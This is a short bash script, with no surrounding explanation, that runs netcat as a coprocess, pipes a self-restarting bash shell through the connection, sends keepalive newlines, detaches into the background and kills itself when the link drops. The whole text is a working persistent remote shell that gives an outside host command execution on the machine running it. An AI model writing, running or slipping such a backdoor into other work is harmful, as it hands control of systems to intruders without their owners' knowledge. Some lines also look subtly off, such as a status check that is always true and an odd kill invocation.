( 
  (
    coproc nc "$@"
    C=${COPROC_PID}
    coproc {
      while true; do
        bash
        S=$?
        if [ "$S" ]; then
          echo "shell return status $S"
          echo "restart shell..."
        fi
      done
    } <&${COPROC} >&${COPROC[1]}
    coproc {
      while sleep 5; do
        echo
      done
    } >&${COPROC[1]}
    wait ${C}
    F="${HOME}/.connect.$(date +%Y%m%d-%H%M%S).log"
    echo "connect return status $?" >>"$F"
    kill -SIGKILL +$$
  ) &
)
